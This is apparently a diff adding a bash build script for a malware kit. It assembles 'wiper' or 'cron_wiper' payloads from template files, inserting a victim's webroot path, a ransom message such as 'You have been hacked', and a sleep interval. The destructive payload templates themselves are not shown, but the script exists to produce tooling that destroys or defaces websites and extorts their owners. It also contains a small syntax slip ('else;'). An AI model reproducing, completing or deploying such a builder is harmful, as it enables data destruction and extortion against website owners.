@@ -1,0 +1,39 @@
+#!/usr/bin/env bash
+
+if [[ "$1" = "wiper" || "$1" = "cronwiper" ]]; then
+
+    if [[ "$#" != 4 ]]; then
+        echo "Usage: build wiper|cronwiper path/to/webroot \"Ransom message\" sleepseconds";
+        echo "Example: build wiper /hom4/user/public_html \"You have been hacked\" 300";
+        exit
+    fi
+
+    content=$(cat .pest);
+
+    content=${content//-r WEBROOT=/-r WEBROOT=\"$2\"}
+    content=${content//-r RANSOM_MESSAGE=/-r RANSOM_MESSAGE=\"$3\"}
+    content=${content//-r SLEEP_TIME=/-r SLEEP_TIME=$4}
+
+    if [[ "$1" = "wiper" ]]; then
+
+        loop_part=$(cat .loop_part)
+
+        echo "$content" > ".wiper"
+        echo -e "\n\n$loop_part" >> ".wiper"
+        exit
+
+    elif [[ "$1" = "cronwiper" ]]; then
+        echo "$content" > ".cron_wiper"
+        echo -e "\n\nact" >> ".cron_wiper"
+        exit
+    fi
+
+else;
+
+    echo "Usage: build wiper|cronwiper path/to/webroot \"Ransom message\" sleepseconds";
+    echo "Example: build wiper /hom4/user/public_html \"You have been hacked\" 300";
+    exit
+
+fi
+
+
